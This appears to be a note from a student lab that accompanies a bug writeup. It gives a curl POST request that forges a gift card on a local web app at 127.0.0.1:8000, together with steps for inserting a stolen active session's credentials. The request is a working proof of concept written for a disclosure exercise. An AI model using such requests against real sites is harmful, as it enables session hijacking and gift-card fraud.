This curl request is used to trigger the CSRF attack described in my bugs.txt writeup. Because this bug is very situation dependent, for this to work you need to grab an active session and copy its security credentials. Then you must supply a giftcard value you haven't yet used (for some reason it can only create crads of a given value once). Add those into this request per my description in bugs.txt and this will work.

curl -i -s -k -X $'POST'     -H $'Host: 127.0.0.1:8000' -H $'Content-Length: 29' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"' -H $'sec-ch-ua-mobile: ?0' -H $'sec-ch-ua-platform: \"Windows\"' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: http://127.0.0.1:8000/gift.html' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close'     --data-binary $'amount=2422333&username=user1'     $'http://127.0.0.1:8000/gift/0' 
